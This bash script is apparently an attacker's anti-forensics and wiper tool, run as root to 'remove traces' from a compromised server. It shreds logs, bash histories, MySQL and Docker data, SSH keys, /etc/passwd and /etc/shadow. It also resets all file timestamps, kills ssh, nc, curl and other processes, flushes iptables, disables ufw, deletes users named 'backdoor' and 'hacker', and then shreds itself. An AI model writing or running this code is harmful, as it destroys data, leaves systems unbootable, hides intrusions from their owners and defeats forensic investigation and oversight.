#!/bin/bash

# Check for root privileges
if [[ $EUID -ne 0 ]]; then
    echo "[!] This script must be run as ROOT."
    exit 1
fi

echo "[*] Starting advanced trace removal on the server..."

# -------------------------
# Delete comprehensive logs
# -------------------------
delete_logs() {
    echo "[*] Deleting comprehensive logs..."
    log_dirs=(
        "/var/log"
        "/tmp"
        "/var/tmp"
        "/root/.bash_history"
        "/home/*/.bash_history"
        "/var/lib/mysql"
        "/var/lib/docker"
    )
    for dir in "${log_dirs[@]}"; do
        if [ -d "$dir" ]; then
            find "$dir" -type f -exec shred -u -z {} \; &>/dev/null
            echo "[✔️] Deleted logs in: $dir"
        fi
    done
}

# -------------------------
# Modify timestamps
# -------------------------
modify_timestamps() {
    echo "[*] Modifying timestamps for all files..."
    find / -type f -exec touch -t $(date +%Y%m%d%H%M) {} \; &>/dev/null
}

# -------------------------
# Hide suspicious processes
# -------------------------
hide_processes() {
    echo "[*] Hiding suspicious processes..."
    processes=("ssh" "nc" "python" "bash" "perl" "ruby" "wget" "curl")
    for proc in "${processes[@]}"; do
        pkill -f "$proc" &>/dev/null
    done
}

# -------------------------
# Reset network and firewall settings
# -------------------------
reset_network() {
    echo "[*] Resetting network and firewall settings..."
    iptables -F &>/dev/null
    iptables -X &>/dev/null
    iptables -t nat -F &>/dev/null
    iptables -t nat -X &>/dev/null
    ufw disable &>/dev/null
}

# -------------------------
# Delete suspicious users
# -------------------------
delete_users() {
    echo "[*] Deleting suspicious users..."
    users=("test" "backdoor" "hacker")
    for user in "${users[@]}"; do
        deluser --remove-home "$user" &>/dev/null
    done
}

# -------------------------
# Delete SSH keys and authentications
# -------------------------
delete_ssh_keys() {
    echo "[*] Deleting SSH keys..."
    find /root/.ssh /home/*/.ssh /etc/ssh/ -type f -exec shred -u -z {} \; &>/dev/null
}

# -------------------------
# Delete sensitive system files
# -------------------------
delete_sensitive_files() {
    echo "[*] Deleting sensitive system files..."
    sensitive_files=(
        "/etc/passwd"
        "/etc/shadow"
        "/etc/hosts"
        "/etc/hostname"
        "/etc/network/interfaces"
    )
    for file in "${sensitive_files[@]}"; do
        shred -u -z "$file" &>/dev/null
    done
}

# -------------------------
# Self-destruct the script
# -------------------------
self_destruct() {
    echo "[*] Self-destructing the script..."
    shred -u -z "$0" &>/dev/null
}

# -------------------------
# Execute all functions
# -------------------------
delete_logs
modify_timestamps
hide_processes
reset_network
delete_users
delete_ssh_keys
delete_sensitive_files
self_destruct

echo "[✔️] All traces successfully removed!"
exit 0
